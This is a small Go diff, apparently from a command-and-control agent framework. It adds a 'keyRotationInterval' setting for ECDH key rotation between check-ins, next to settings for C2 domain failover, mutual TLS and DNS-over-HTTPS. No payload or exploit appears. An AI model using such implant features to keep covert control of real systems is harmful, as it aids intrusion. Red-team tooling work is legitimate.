@@ -60,6 +60,7 @@ var (
 	httpxRotation          string = "" // httpx domain rotation: fail-over, round-robin, random
 	httpxFailoverThreshold string = "" // httpx failover threshold (consecutive failures before switching)
 	recoveryInterval       string = "" // Seconds between recovery attempts for unhealthy C2 domains (default: 600)
+	keyRotationInterval    string = "" // Check-ins between ECDH key rotations (0 = disabled)
 	mtlsCertPEM            string = "" // Base64-encoded PEM client certificate for mutual TLS authentication
 	mtlsKeyPEM             string = "" // Base64-encoded PEM client private key for mutual TLS authentication
 	dohResolver            string = "" // DNS-over-HTTPS provider for all agent DNS: cloudflare, google, quad9, or custom URL
@@ -106,6 +107,7 @@ func clearGlobals() {
 	httpxRotation = ""
 	httpxFailoverThreshold = ""
 	recoveryInterval = ""
+	keyRotationInterval = ""
 
 	// Operational parameters
 	sleepInterval = ""
